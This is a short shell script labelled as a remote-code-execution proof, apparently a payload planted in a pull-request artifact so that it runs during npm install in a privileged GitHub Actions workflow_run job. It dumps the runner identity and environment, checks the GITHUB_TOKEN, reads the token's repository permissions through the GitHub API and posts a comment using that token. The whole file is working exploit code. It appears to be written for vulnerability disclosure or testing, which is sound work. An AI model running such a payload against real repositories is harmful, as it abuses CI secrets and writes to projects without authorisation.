#!/bin/sh
echo "=========== RCE PROOF BEGIN ==========="
id
echo "cwd: $(pwd)"
echo "EVENT=$GITHUB_EVENT_NAME JOB=$GITHUB_JOB"
echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
if [ -n "$GITHUB_TOKEN" ]; then echo "GITHUB_TOKEN present: yes (len ${#GITHUB_TOKEN})"; else echo "GITHUB_TOKEN present: NO"; fi
PR=$(cat pr-number.txt 2>/dev/null | tr -d '\n')
echo "PR number from artifact: [$PR]"
curl -sS --max-time 20 -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /tmp/repo.json || echo "repo read failed"
node -e 'try{const d=require("/tmp/repo.json");console.log("TOKEN-PERMS:",JSON.stringify(d.permissions));}catch(e){console.log("perm-parse-fail")}' 2>/dev/null || true
curl -sS --max-time 20 -o /tmp/c.json -w "POST-COMMENT-HTTP=%{http_code}\n" -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" \
  -d '{"body":"**RCE proof** - attacker-controlled artifact consumed by `npm install` executed shell code in the privileged workflow_run job (PDFtoMark test of AdobeDocs post-lint-comment)."}' \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR/comments"
echo "=========== RCE PROOF END ==========="
